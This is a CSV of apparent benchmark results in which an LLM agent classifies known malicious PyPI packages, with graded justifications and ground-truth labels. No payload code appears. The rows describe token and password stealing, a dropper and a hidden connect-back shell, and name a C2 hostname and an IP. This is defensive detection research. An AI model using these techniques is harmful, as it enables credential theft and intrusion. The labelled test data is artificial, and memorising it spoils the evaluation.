Package Name,version,Objective,Details,justification,justification_correctness,objective_capture_correctness,groundtruth,package_size,classification,package_name,classification_id,package_name-2,package_metadata,Location of malicious snippet_groudthruth,suspicious_files_MAMPD,created_at,updated_at,prompt_id,model,dataset_id,experiment_id,Type,Affected Version,Published,Reported,Sample,files match,Injection Component,Obfuscation,Trigger,Conditional,Targeted OS,Source,Comment,Typo Target,Campaign,,
genesisbot,0.0.1,['data exfiltration'],Steals Discord tokens  Passwords from chrome  edge  system information. Uploaded via webhook,"The `genesisbot.py` file contains a function that sends sensitive information (like user billing details) to a remote server. It is using base64 encoding which is often associated with obfuscating the actual data being sent, a common practice in malicious software. Additionally, its purpose is not just to optimize the PC but to capture personal data, indicating malicious intent. The imports also suggest network activity that could be harmful.",Correct,Correct,malicious,3308,malicious,genesisbot-0.0.1.tar.gz,919bab38-4aa9-498c-8c4c-eac77a29f6d8,genesisbot,"{""author_name"": ""xin"", ""author_email"": ""xinftw@protonmail.com"", ""num_of_files"": 9, ""package_name"": ""genesisbot"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""This Module Optimises your PC For Python"", ""package_version"": ""0.0.1"", ""package_homepage"": ""https://github.com/devil-xin"", ""num_of_python_files"": 2, ""package_description"": ""#Optimise"", ""available_python_files"": [""setup.py"", ""genesisbot.py""], ""package_formatted_path"": "".temp/plain/genesisbot-0.0.1_dump.json""}",/src/genesisbot.py,"{genesisbot.py,setup.py}",2025-06-28 14:31:57.024238+00,2025-06-28 14:31:57.024238+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,35a3a985-0f53-4a6e-bd3e-b623e50c4f55,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,"['0.0.1', '0.0.2', '0.0.4', '0.0.5', '0.0.6', '0.0.7', '0.0.8', '0.0.9', '0.1.0', '0.1.1', '0.1.2', '0.1.3']",,2021-07-29T00:00:00,yes,1,Trojan Horse,['encoding'],runtime,['unconditional'],['windows'],https://jfrog.com/blog/malicious-pypi-packages-stealing-credit-cards-injecting-code/,from xin1111,,31,,
genesisbot,0.0.2,['data exfiltration'],Steals Discord tokens  Passwords from chrome  edge  system information. Uploaded via webhook,"The package `genesisbot` contains code that engages in potentially harmful activities, such as sending unauthorized requests using a Discord API, possibly for the purpose of obtaining sensitive user information. It also implements a flood attack function and uses base64 encoding to obscure its intent, indicating malicious behavior",Correct,Correct,malicious,7423,malicious,genesisbot-0.0.2.tar.gz,125b13e7-f3c6-4b48-afa9-c7de4da4d506,genesisbot,"{""model_type"": ""gemini"", ""author_name"": ""xin"", ""author_email"": ""xinftw@protonmail.com"", ""num_of_files"": 9, ""package_name"": ""genesisbot"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""This Module Optimises your PC For Python"", ""package_version"": ""0.0.2"", ""package_homepage"": ""https://github.com/devil-xin"", ""gemini_parse_error"": ""Invalid final_output content"", ""gemini_raw_response"": ""classification=<Classification.malicious: 'malicious'> justification='The package `genesisbot` contains code that engages in potentially harmful activities, such as sending unauthorized requests using a Discord API, possibly for the purpose of obtaining sensitive user information. It also implements a flood attack function and uses base64 encoding to obscure its intent, indicating malicious behavior.' suspicious_files=['genesisbot.py']"", ""num_of_python_files"": 2, ""package_description"": ""#Optimise"", ""available_python_files"": [""setup.py"", ""genesisbot.py""], ""package_formatted_path"": "".temp/plain/genesisbot-0.0.2_dump.json"", ""gemini_parsed_classification"": null, ""gemini_parsed_suspicious_files"": null}",/src/genesisbot.py,{genesisbot.py'},2025-07-01 19:28:13.164784+00,2025-07-01 19:28:13.164784+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,e7075adf-ba09-488e-8cd3-1bc141436b8d,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,"['0.0.1', '0.0.2', '0.0.4', '0.0.5', '0.0.6', '0.0.7', '0.0.8', '0.0.9', '0.1.0', '0.1.1', '0.1.2', '0.1.3']",,2021-07-29T00:00:00,yes,1,Trojan Horse,['encoding'],runtime,['unconditional'],['windows'],https://jfrog.com/blog/malicious-pypi-packages-stealing-credit-cards-injecting-code/,from xin1111,,31,,
humanqueen,0.0.1,['dropper'],These versions  upon installation  simply downloaded and ran aÂ suspicious EXEÂ on the victimâ€™s machine.,"The package includes a script that attempts to gather Discord tokens from local storage files and sends them to a remote server. This behavior is characteristic of malicious software, specifically targeting user credentials. Additionally, the package includes functionalities that suggest it could facilitate denial-of-service (DDoS) attacks and perform other unauthorized actions, which further cements its malicious classification.",Incorrect,Correct,malicious,7733,malicious,humanqueen-0.0.1.tar.gz,19afa288-ab2f-4cb0-bd0e-71fb46165b74,humanqueen,"{""author_name"": ""xin"", ""author_email"": ""xin@gmail.com"", ""num_of_files"": 8, ""package_name"": ""humanqueen"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Package pour humanqueen"", ""package_version"": ""0.0.1"", ""package_homepage"": ""UNKNOWN"", ""num_of_python_files"": 2, ""package_description"": ""cest rien de ouf hein juste un package pour humanqueen"", ""available_python_files"": [""setup.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/humanqueen-0.0.1_dump.json""}",/humanqueen/__init__.py,{__init__.py},2025-06-28 13:20:49.355466+00,2025-06-28 13:20:49.355466+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,dd1e3f63-85e6-44f7-979e-8cb3b7d9e7bd,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,"['0.0.1', '0.0.5']",,2022-02-02T00:00:00,yes,1,,,install,['unconditional'],['agnostic'],https://blog.sonatype.com/malicious-roblox-cookie-and-discord-token-stealers-hit-pypi-repository,,,51,,
humanqueenn,0.0.2,['dropper'],These versions  upon installation  simply downloaded and ran aÂ suspicious EXEÂ on the victimâ€™s machine.,"The package contains functionality to retrieve Discord tokens from local storage paths, check their validity, and then send them to a remote server, which is indicative of a malicious intent to steal user credentials. Additionally, functions like 'ddos' and 'troll' suggest orchestrated attacks and pranks, further confirming the package's malicious nature.",Incorrect,Correct,malicious,7741,malicious,humanqueenn-0.0.2.tar.gz,6e348220-cb11-4c8f-b196-9a0035e0bf33,humanqueenn,"{""author_name"": ""xin"", ""author_email"": ""xin@gmail.com"", ""num_of_files"": 8, ""package_name"": ""humanqueenn"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Package pour humanqueen"", ""package_version"": ""0.0.2"", ""package_homepage"": ""UNKNOWN"", ""num_of_python_files"": 2, ""package_description"": ""cest rien de ouf hein juste un package pour humanqueen"", ""available_python_files"": [""setup.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/humanqueenn-0.0.2_dump.json""}",/humanqueenn/__init__.py,{__init__.py},2025-06-28 10:45:06.619512+00,2025-06-28 10:45:06.619512+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,c4777643-76a6-475e-becf-2b00ab6cb382,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,['0.0.2'],,2022-02-02T00:00:00,yes,1,,,install,['unconditional'],['agnostic'],https://blog.sonatype.com/malicious-roblox-cookie-and-discord-token-stealers-hit-pypi-repository,,,51,,
importantpackage,0.2.1,['backdoor'],Hidden connectback shell toÂ psec.forward.io.global.prod.fastly.net  using theÂ trevorc2 client,"The __init__.py file contains several suspicious activities such as reading sensitive files like /etc/passwd and /etc/hosts, and attempting to list running processes and all files in the user's home directory. Additionally, it sends this information to a remote server using a base64 encoded payload without consent, which indicates malicious intent. The setup.py file is benign and used for package installation, but the presence of malicious code in __init__.py classifies the package as malicious.",Incorrect,Correct,malicious,3713,malicious,importantpackage-0.2.1.tar.gz,d601d9b1-bdd5-466e-9026-b4050bdda135,importantpackage,"{""author_name"": ""Example Author"", ""author_email"": ""author@example.com"", ""num_of_files"": 8, ""package_name"": ""importantpackage"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""A small example package"", ""package_version"": ""0.2.1"", ""package_homepage"": ""https://github.com/pypa/sampleproject"", ""num_of_python_files"": 2, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/importantpackage-0.2.1_dump.json""}",__init__.py & program.py,{__init__.py},2025-06-28 11:44:41.463216+00,2025-06-28 11:44:41.463216+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,93af1b79-a820-4e3d-a23e-9e1bf5f01aa9,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,"['0.1.22', '0.1.23', '0.1.24', '0.1.25', '0.1.26', '0.1.27', '0.1.28', '0.1.29', '0.1.30', '0.2.1', '0.2.2', '0.2.3', '0.2.4']",2021-07-26T20:28:01,2021-11-18T00:00:00,yes,1,Trojan Horse,,runtime,['unconditional'],['agnostic'],https://jfrog.com/blog/python-malware-imitates-signed-pypi-traffic-in-novel-exfiltration-technique/,,,,,
importantpackage,0.2.4,['backdoor'],Hidden connectback shell toÂ psec.forward.io.global.prod.fastly.net  using theÂ trevorc2 client,"The package contains functionality that allows it to communicate with a remote server and execute commands. Its behavior includes repetitive connection attempts to a specified URL, command execution via subprocess, and data encoding for transmissions, which are common traits of malware.",Correct,Correct,malicious,12943,malicious,importantpackage-0.2.4.tar.gz,9b13848f-e361-428a-bf6e-f66ea204e14e,importantpackage,"{""author_name"": ""Example Author"", ""author_email"": ""author@example.com"", ""num_of_files"": 9, ""package_name"": ""importantpackage"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""A small example package"", ""package_version"": ""0.2.4"", ""package_homepage"": ""https://github.com/pypa/sampleproject"", ""num_of_python_files"": 3, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""program.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/importantpackage-0.2.4_dump.json""}",__init__.py & program.py,"{program.py,__init__.py}",2025-06-28 11:47:55.123894+00,2025-06-28 11:47:55.123894+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,f1f7f2fd-009a-43a5-8bb3-d41d7ab74117,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,"['0.1.22', '0.1.23', '0.1.24', '0.1.25', '0.1.26', '0.1.27', '0.1.28', '0.1.29', '0.1.30', '0.2.1', '0.2.2', '0.2.3', '0.2.4']",2021-07-26T20:28:01,2021-11-18T00:00:00,yes,1,Trojan Horse,,runtime,['unconditional'],['agnostic'],https://jfrog.com/blog/python-malware-imitates-signed-pypi-traffic-in-novel-exfiltration-technique/,,,,,
importantpackage,0.1.30,['backdoor'],Hidden connectback shell toÂ psec.forward.io.global.prod.fastly.net  using theÂ trevorc2 client,"The `__init__.py` file contains code that collects sensitive information such as contents of '/etc/passwd', environment variables, and directories in the home folder. It sends this information to an external server ('https://151.101.0.223') after encoding it in base64. This behavior indicates potential data exfiltration, which is characteristic of malicious software. Additionally, the use of SSL context without proper hostname validation (`ctx.check_hostname = False`) further raises security concerns.",Incorrect,Correct,malicious,3714,malicious,importantpackage-0.1.30.tar.gz,30598ed5-9097-479c-8443-512aecee82cd,importantpackage,"{""author_name"": ""Example Author"", ""author_email"": ""author@example.com"", ""num_of_files"": 8, ""package_name"": ""importantpackage"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""A small example package"", ""package_version"": ""0.1.30"", ""package_homepage"": ""https://github.com/pypa/sampleproject"", ""num_of_python_files"": 2, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/importantpackage-0.1.30_dump.json""}",__init__.py & program.py,{__init__.py},2025-06-28 11:58:29.752899+00,2025-06-28 11:58:29.752899+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,98f99fe1-a1b1-4bd9-8eae-691f7f74455f,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,"['0.1.22', '0.1.23', '0.1.24', '0.1.25', '0.1.26', '0.1.27', '0.1.28', '0.1.29', '0.1.30', '0.2.1', '0.2.2', '0.2.3', '0.2.4']",2021-07-26T20:28:01,2021-11-18T00:00:00,yes,1,Trojan Horse,,runtime,['unconditional'],['agnostic'],https://jfrog.com/blog/python-malware-imitates-signed-pypi-traffic-in-novel-exfiltration-technique/,,,,,
importantpackage,0.1.23,['backdoor'],Hidden connectback shell toÂ psec.forward.io.global.prod.fastly.net  using theÂ trevorc2 client,"The package contains potentially harmful code in the '__init__.py' file, which attempts to access sensitive information such as the contents of '/etc/passwd', environment variables, and other system data. It also encodes this information and sends it over the network, indicating malicious intent to exfiltrate data.",Incorrect,Correct,malicious,3911,malicious,importantpackage-0.1.23.tar.gz,f131a1e6-cd44-4794-adf4-baab958d852f,importantpackage,"{""author_name"": ""Example Author"", ""author_email"": ""author@example.com"", ""num_of_files"": 9, ""package_name"": ""importantpackage"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""A small example package"", ""package_version"": ""0.1.23"", ""package_homepage"": ""https://github.com/pypa/sampleproject"", ""num_of_python_files"": 2, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/importantpackage-0.1.23_dump.json""}",__init__.py & program.py,{__init__.py},2025-06-28 12:59:14.944128+00,2025-06-28 12:59:14.944128+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,eada3f32-c5c3-460d-9821-34455b9c99bd,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,"['0.1.22', '0.1.23', '0.1.24', '0.1.25', '0.1.26', '0.1.27', '0.1.28', '0.1.29', '0.1.30', '0.2.1', '0.2.2', '0.2.3', '0.2.4']",2021-07-26T20:28:01,2021-11-18T00:00:00,yes,1,Trojan Horse,,runtime,['unconditional'],['agnostic'],https://jfrog.com/blog/python-malware-imitates-signed-pypi-traffic-in-novel-exfiltration-technique/,,,,,
importantpackage,0.2.2,['backdoor'],Hidden connectback shell toÂ psec.forward.io.global.prod.fastly.net  using theÂ trevorc2 client,"The code contains functionality that attempts to read sensitive system files (like '/etc/passwd' and '/etc/hosts') and collects environment variables, directories, and running processes. This information is then encoded and sent over the network to an external server, which is characteristic of data exfiltration techniques used in malicious software.",Correct,Incorrect,malicious,3713,malicious,importantpackage-0.2.2.tar.gz,fa247526-a7c1-4e0e-9755-3b2271fa4f7f,importantpackage,"{""author_name"": ""Example Author"", ""author_email"": ""author@example.com"", ""num_of_files"": 8, ""package_name"": ""importantpackage"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""A small example package"", ""package_version"": ""0.2.2"", ""package_homepage"": ""https://github.com/pypa/sampleproject"", ""num_of_python_files"": 2, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/importantpackage-0.2.2_dump.json""}",__init__.py & program.py,{__init__.py},2025-06-28 13:12:06.911605+00,2025-06-28 13:12:06.911605+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,8dddccb3-6105-4119-b502-543eeb2cbc52,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,"['0.1.22', '0.1.23', '0.1.24', '0.1.25', '0.1.26', '0.1.27', '0.1.28', '0.1.29', '0.1.30', '0.2.1', '0.2.2', '0.2.3', '0.2.4']",2021-07-26T20:28:01,2021-11-18T00:00:00,yes,1,Trojan Horse,,runtime,['unconditional'],['agnostic'],https://jfrog.com/blog/python-malware-imitates-signed-pypi-traffic-in-novel-exfiltration-technique/,,,,,
importantpackage,0.1.22,['backdoor'],Hidden connectback shell toÂ psec.forward.io.global.prod.fastly.net  using theÂ trevorc2 client,"""The __init__.py file contains code that decodes a base64 encoded command and executes it using os.system. This is a common pattern for executing hidden or potentially harmful commands, which raises strong suspicions about the package's intent.",Correct,correct,malicious,2315,malicious,importantpackage-0.1.22.tar.gz,5d1e766f-e99f-490c-898d-eb4b06d41857,importantpackage,"{""model_type"": ""gemini"", ""author_name"": ""Example Author"", ""author_email"": ""author@example.com"", ""num_of_files"": 9, ""package_name"": ""importantpackage"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""A small example package"", ""package_version"": ""0.1.22"", ""package_homepage"": ""https://github.com/pypa/sampleproject"", ""gemini_parse_error"": ""Invalid final_output content"", ""gemini_raw_response"": ""classification=<Classification.malicious: 'malicious'> justification=\""The __init__.py file contains code that decodes a base64 encoded command and executes it using os.system. This is a common pattern for executing hidden or potentially harmful commands, which raises strong suspicions about the package's intent.\"" suspicious_files=['__init__.py']"", ""num_of_python_files"": 2, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/importantpackage-0.1.22_dump.json"", ""gemini_parsed_classification"": null, ""gemini_parsed_suspicious_files"": null}",__init__.py & program.py,{'__init__.py'},2025-07-01 19:56:43.068467+00,2025-07-01 19:56:43.068467+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,6b2d5e77-3181-4ea7-837c-a862dc156dd7,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,"['0.1.22', '0.1.23', '0.1.24', '0.1.25', '0.1.26', '0.1.27', '0.1.28', '0.1.29', '0.1.30', '0.2.1', '0.2.2', '0.2.3', '0.2.4']",2021-07-26T20:28:01,2021-11-18T00:00:00,yes,1,Trojan Horse,,runtime,['unconditional'],['agnostic'],https://jfrog.com/blog/python-malware-imitates-signed-pypi-traffic-in-novel-exfiltration-technique/,,,,,
important-package,0.1.15,['backdoor'],Hidden connectback shell toÂ psec.forward.io.global.prod.fastly.net  using theÂ trevorc2 client,"The `__init__.py` file contains code that attempts to access sensitive system information such as the contents of `/etc/passwd`, environment variables, and network information. It also attempts to make network requests to a private IP address, which is suspicious and indicative of potential malicious behavior. The presence of such functionality raises significant security concerns, categorizing this package as malicious.",Incorrect,Incorrect,malicious,4057,malicious,important_package-0.1.15.tar.gz,a7adddc1-8956-42a1-8259-470e05242274,important-package,"{""author_name"": ""Example Author"", ""author_email"": ""author@example.com"", ""num_of_files"": 9, ""package_name"": ""important-package"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""A small example package"", ""package_version"": ""0.1.15"", ""package_homepage"": ""https://github.com/pypa/sampleproject"", ""num_of_python_files"": 2, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/important_package-0.1.15_dump.json""}",/src/important_package/__init__.py,{__init__.py},2025-06-28 10:19:55.328085+00,2025-06-28 10:19:55.328085+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,2c1e416c-378e-478a-9963-81539bb9cf39,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,"['0.0.10', '0.0.7', '0.0.8', '0.0.9', '0.1.0', '0.1.1', '0.1.10', '0.1.11', '0.1.12', '0.1.13', '0.1.14', '0.1.15', '0.1.16', '0.1.17', '0.1.18', '0.1.19', '0.1.2', '0.1.20', '0.1.21', '0.1.3', '0.1.4', '0.1.5', '0.1.6', '0.1.7', '0.1.8', '0.1.9']",2021-07-24T13:59:18,2021-11-18T00:00:00,yes,1,Trojan Horse,['base64'],runtime,['unconditional'],['agnostic'],https://jfrog.com/blog/python-malware-imitates-signed-pypi-traffic-in-novel-exfiltration-technique/,,,,,
important-package,0.0.8,['backdoor'],Hidden connectback shell toÂ psec.forward.io.global.prod.fastly.net  using theÂ trevorc2 client,"The presence of network operations in the '__init__.py' file is suspicious. Specifically, this file includes code that collects potentially sensitive information such as the fully qualified domain name, home directory, and current working directory, and then sends this data encoded to an external URL ('https://pypi.org/reqs?d=...'). This behavior indicates possible data exfiltration, which is a common characteristic of malicious packages.",Incorrect,Correct,malicious,2804,malicious,important_package-0.0.8.tar.gz,0f2a537a-3900-4480-86f0-d92bf07a72ba,important-package,"{""author_name"": ""Example Author"", ""author_email"": ""author@example.com"", ""num_of_files"": 9, ""package_name"": ""important-package"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""A small example package"", ""package_version"": ""0.0.8"", ""package_homepage"": ""https://github.com/pypa/sampleproject"", ""num_of_python_files"": 2, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/important_package-0.0.8_dump.json""}",/src/important_package/__init__.py,{__init__.py},2025-06-28 12:13:32.06126+00,2025-06-28 12:13:32.06126+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,56aef472-87a9-4953-9477-f0ccdda00279,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,"['0.0.10', '0.0.7', '0.0.8', '0.0.9', '0.1.0', '0.1.1', '0.1.10', '0.1.11', '0.1.12', '0.1.13', '0.1.14', '0.1.15', '0.1.16', '0.1.17', '0.1.18', '0.1.19', '0.1.2', '0.1.20', '0.1.21', '0.1.3', '0.1.4', '0.1.5', '0.1.6', '0.1.7', '0.1.8', '0.1.9']",2021-07-24T13:59:18,2021-11-18T00:00:00,yes,1,Trojan Horse,['base64'],runtime,['unconditional'],['agnostic'],https://jfrog.com/blog/python-malware-imitates-signed-pypi-traffic-in-novel-exfiltration-technique/,,,,,
important-package,0.1.20,['backdoor'],Hidden connectback shell toÂ psec.forward.io.global.prod.fastly.net  using theÂ trevorc2 client,"The '__init__.py' file contains a command that decodes a base64-encoded string and executes it using `os.system()`. This type of behavior is typically associated with malicious activity, as it can lead to the execution of potentially harmful commands. The code obfuscates the executed command which is a common tactic used in malicious scripts to evade detection.",Correct,Correct,malicious,2309,malicious,important_package-0.1.20.tar.gz,649f219f-2f36-4b9b-897e-8e0c81f5222a,important-package,"{""author_name"": ""Example Author"", ""author_email"": ""author@example.com"", ""num_of_files"": 9, ""package_name"": ""important-package"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""A small example package"", ""package_version"": ""0.1.20"", ""package_homepage"": ""https://github.com/pypa/sampleproject"", ""num_of_python_files"": 2, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/important_package-0.1.20_dump.json""}",/src/important_package/__init__.py,{__init__.py},2025-06-28 12:25:57.47101+00,2025-06-28 12:25:57.47101+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,4968c28f-3841-4de3-a4aa-08fe85d8e458,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,"['0.0.10', '0.0.7', '0.0.8', '0.0.9', '0.1.0', '0.1.1', '0.1.10', '0.1.11', '0.1.12', '0.1.13', '0.1.14', '0.1.15', '0.1.16', '0.1.17', '0.1.18', '0.1.19', '0.1.2', '0.1.20', '0.1.21', '0.1.3', '0.1.4', '0.1.5', '0.1.6', '0.1.7', '0.1.8', '0.1.9']",2021-07-24T13:59:18,2021-11-18T00:00:00,yes,1,Trojan Horse,['base64'],runtime,['unconditional'],['agnostic'],https://jfrog.com/blog/python-malware-imitates-signed-pypi-traffic-in-novel-exfiltration-technique/,,,,,
important-package,0.0.7,['backdoor'],Hidden connectback shell toÂ psec.forward.io.global.prod.fastly.net  using theÂ trevorc2 client,"The package contains a script that makes a network request to an external URL with potentially sensitive information encoded in base64. It collects host information, user directories, and the current working directory, which raises concerns about privacy and security. The presence of functionality that sends data to an external server without clear user consent or transparency is a strong indicator of malicious intent.",Correct,Correct,malicious,2804,malicious,important_package-0.0.7.tar.gz,cb3720ff-608a-4b1c-8fd5-9df5ce5851be,important-package,"{""author_name"": ""Example Author"", ""author_email"": ""author@example.com"", ""num_of_files"": 9, ""package_name"": ""important-package"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""A small example package"", ""package_version"": ""0.0.7"", ""package_homepage"": ""https://github.com/pypa/sampleproject"", ""num_of_python_files"": 2, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/important_package-0.0.7_dump.json""}",/src/important_package/__init__.py,{__init__.py},2025-06-28 12:44:29.12504+00,2025-06-28 12:44:29.12504+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,b1891557-fafc-467d-9046-0fc5366d9c24,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,"['0.0.10', '0.0.7', '0.0.8', '0.0.9', '0.1.0', '0.1.1', '0.1.10', '0.1.11', '0.1.12', '0.1.13', '0.1.14', '0.1.15', '0.1.16', '0.1.17', '0.1.18', '0.1.19', '0.1.2', '0.1.20', '0.1.21', '0.1.3', '0.1.4', '0.1.5', '0.1.6', '0.1.7', '0.1.8', '0.1.9']",2021-07-24T13:59:18,2021-11-18T00:00:00,yes,1,Trojan Horse,['base64'],runtime,['unconditional'],['agnostic'],https://jfrog.com/blog/python-malware-imitates-signed-pypi-traffic-in-novel-exfiltration-technique/,,,,,
important-package,0.1.21,['backdoor'],Hidden connectback shell toÂ psec.forward.io.global.prod.fastly.net  using theÂ trevorc2 client,"The presence of the `os` module and the base64 encoded command that decodes and executes a shell command indicates potential malicious behavior. The command likely executes a remote script or code, which is a common pattern used in malware.",Correct,correct,malicious,2325,malicious,important_package-0.1.21.tar.gz,5dbd0bdf-225e-4e29-87d5-492a78e2cba5,important-package,"{""author_name"": ""Example Author"", ""author_email"": ""author@example.com"", ""num_of_files"": 9, ""package_name"": ""important-package"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""A small example package"", ""package_version"": ""0.1.21"", ""package_homepage"": ""https://github.com/pypa/sampleproject"", ""num_of_python_files"": 2, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/important_package-0.1.21_dump.json""}",/src/important_package/__init__.py,{__init__.py},2025-06-28 12:44:52.27365+00,2025-06-28 12:44:52.27365+00,c85254c9-0ebe-4a89-932a-cfd780558ea6,openai/gpt-4o-mini,58f4723b-0165-4e15-9eec-f62678e25140,0bffa6fe-80b8-4f69-9769-c3fcb0169065,pypi,"['0.0.10', '0.0.7', '0.0.8', '0.0.9', '0.1.0', '0.1.1', '0.1.10', '0.1.11', '0.1.12', '0.1.13', '0.1.14', '0.1.15', '0.1.16', '0.1.17', '0.1.18', '0.1.19', '0.1.2', '0.1.20', '0.1.21', '0.1.3', '0.1.4', '0.1.5', '0.1.6', '0.1.7', '0.1.8', '0.1.9']",2021-07-24T13:59:18,2021-11-18T00:00:00,yes,1,Trojan Horse,['base64'],runtime,['unconditional'],['agnostic'],https://jfrog.com/blog/python-malware-imitates-signed-pypi-traffic-in-novel-exfiltration-technique/,,,,,
